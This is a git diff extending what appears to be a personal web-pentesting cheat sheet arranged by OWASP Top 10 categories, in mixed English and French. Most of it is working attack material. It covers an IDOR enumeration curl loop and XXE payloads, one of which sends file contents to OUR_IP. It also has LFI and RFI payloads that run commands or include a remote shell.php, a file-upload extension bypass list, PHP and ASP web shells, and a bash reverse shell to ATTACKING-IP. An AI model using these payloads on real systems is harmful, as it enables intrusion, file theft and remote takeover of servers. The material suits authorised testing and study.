@@ -1,11 +1,32 @@
-# Top-10-OWASP-CHEATSHEET
-
+# Top-10-OWASP-CHEATSHEET and more
+[Top 10 official OWASP](https://owasp.org/www-project-top-ten/)
   ## *Top 1./ Broken acces control*
-  - IDOR (insecure direct object reference) just modify :
+### IDOR (insecure direct object reference):  
+IDOR are usually used in chain attack with XEE, or HTTP verb tampering,...  
+
+Indentify IDOR:  
+- In URL parameters & APIs  
+- In AJAX Calls  
+- By understanding reference hashing/encoding  
+- By comparing user roles  
   ```bash
   #change parameters post, change id, try and see the response of server 200,404,302 
   http://example.com/user/"35" or http://example.com/user/file.php?image="4",...
   ```
+Sometimes iud are encrypted like base64, md5,...    
+You can detect how is encrypted if is in frontend code and Burpsuite.  
+```bash
+#test
+echo -n "user1" | md5sum
+echo -n "user2" | base64
+#example script bash
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 ); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
   ## *Top 2./ Cryptographic failures*
   - poor Cryptographic implementation, deprecied or insecure algorithm
   - PNRG (Pseudo Random Génerator Number) sometime algorithm use to generate a random number for crypto is predictably (like random in python)
@@ -90,7 +111,31 @@ You can find payloads of Windows and linux with file uploads of this repositorie
   SELECT * from artcile where id = '1' UNION SELECT sleep(1),2 from information_schema.columns where table_name = 'sqli_one' and table_name = 'users' and column_name = 'id';--
   ```
   ## *Top 4 non-secure application*
-  ## *Top 5 bad configuration*
+  ## *Top 5 security misconfiguration*
+  ### XEE (XML External Entity)
+Vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing.  
+To identify XEE finding web pages that accept an XML or JSON user input with Burp  
+
+**Note**: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
+
+**Basic Payloads:**
+```xml
+<!ENTITY xxe SYSTEM "http://localhost/email.dtd">
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+**ByPass with CDATA:**
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+
   ## *Top 6 composant vulnerability*
   ## *Top 7 authentification failure*
   ## *Top 8 failure integrity data*
@@ -135,7 +180,7 @@ Test de payload pour la découverte d'une LFI:
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://example.com/index.php?language=FUZZ
 ```
-Bypass:
+Classic Bypass LFI:
 ```bash
 ....//
 ..././
@@ -144,18 +189,78 @@ Bypass:
 #url encode sur burpsuite
 ./language/../../../
 ```
-PHP filter  
+**PHP filter**    
 ```bash
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id #echo '<?php system($_GET["cmd"]); ?>' | base64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
 ```
-RFI 
-Dans le meme style qu'une faille SSRF
+**RFI**  
+Remote file inclusion, allows the inclusion of remote URLs  
+You can enumerate local port like SSRF:   
+```url
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:<LISTENING_PORT>
 ```
+Gaining remote code execution by including a malicious script that we host
+```url
 http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
 ```
+## *Top 12./ File upload attack*  
 
+***Potential Attack	|  File Types***   
+XSS	              |  HTML, JS, SVG, GIF  
+XXE/SSRF	        |  XML, SVG, PDF, PPT, DOC  
+DoS	              |  ZIP, JPG, PNG 
 
+Link:  
+[List All Content-type](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)  
+[File signatures/Magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)  
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)   
 
+**ByPass Client validation**  
+Upload a real image and modified request in Burp with payload and file name (image.png > shell.php)  
+Or just delete html code who calls the sanytasing function.   
 
+**Bypass Whithlist and Blacklist**   
+You need to test wich .extension backend accept   
+You can add prefix and suffix in Burp Intruder (ex: png.phar, php7.png, php.jpeg, ...) 
+```bash
+.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+```
+
+**Bypass Magic Bytes**
+Just add BytesFile (ex: GIF8) before your payload to trick the back end server its a gif or png. 
+
+**Payload**  
+- if server web use PHP
+```php
+<?php system($_REQUEST['cmd']; ?>
+#/shell.php?cmd=id
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'"); ?>
+#reverse shell
+```
+- if server web use .NET
+```asp
+<% eval request('cmd') %>
+#/shell.net?cmd=id
+```
